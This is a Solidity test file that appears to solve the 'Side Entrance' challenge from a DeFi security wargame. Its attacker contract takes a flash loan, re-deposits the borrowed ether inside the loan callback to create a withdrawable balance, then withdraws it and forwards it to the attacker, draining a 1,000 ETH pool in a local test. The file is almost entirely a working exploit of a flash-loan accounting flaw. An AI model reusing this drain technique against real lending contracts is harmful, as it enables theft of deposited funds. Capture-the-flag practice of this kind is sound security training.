// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract AttackSideEntranceLenderPool is IFlashLoanEtherReceiver {
    address payable public attacker;
    SideEntranceLenderPool pool;
    uint256 public amount;

    constructor(address _pool, address _attacker) {
        pool = SideEntranceLenderPool(_pool);
        attacker = payable(_attacker);
    }

    function execute() external payable override {
        pool.deposit{value: address(this).balance}();
    }

    function attack(uint256 amount_) public {
        pool.flashLoan(amount_);
    }

    function withdraw() public payable {
        pool.withdraw();
    }

    receive() external payable {
        if (msg.sender == address(pool)) {
            attacker.transfer(address(this).balance);
        }
    }
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // NOTE: Here as part of the flash loan you can deposit and accrue a balance that you can withdraw later

        AttackSideEntranceLenderPool attackerContract = new AttackSideEntranceLenderPool(address(sideEntranceLenderPool), address(attacker));
        attackerContract.attack(ETHER_IN_POOL);
        attackerContract.withdraw();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
